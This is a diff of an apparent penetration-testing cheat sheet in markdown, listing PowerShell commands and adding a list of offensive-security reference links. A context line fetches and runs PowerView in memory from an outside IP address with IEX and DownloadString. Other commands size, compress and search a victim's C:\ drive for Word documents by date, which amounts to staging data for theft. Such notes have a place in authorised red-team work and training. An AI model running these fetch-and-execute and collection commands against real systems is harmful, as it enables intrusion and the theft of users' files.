@@ -79,7 +79,7 @@ $ IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.7:9000/PowerView
 Size of Folder
 
 ```sh
-$ "{0} MB" -f ((Get-ChildItem C:\users\trainer\ysoserial-v134\ -Recurse -force | Measure-Object -Property Length -Sum -ErrorAction Stop).Sum / 1MB)
+$ "{0} MB" -f ((Get-ChildItem C:\users\ -Recurse -force | Measure-Object -Property Length -Sum -ErrorAction Stop).Sum / 1MB)
 ```
 
 Compress
@@ -99,8 +99,11 @@ $ Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction Sile
 $ Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate -and $_.LastWriteTime -le $Finddate.adddays(1) }
 ```
 
+## Useful links
 
-
-
-
+https://github.com/swisskyrepo/PayloadsAllTheThings
+https://book.hacktricks.xyz/
+https://gtfobins.github.io/
+https://github.com/LOLBAS-Project/LOLBAS/blob/master/README.md
+https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf
 
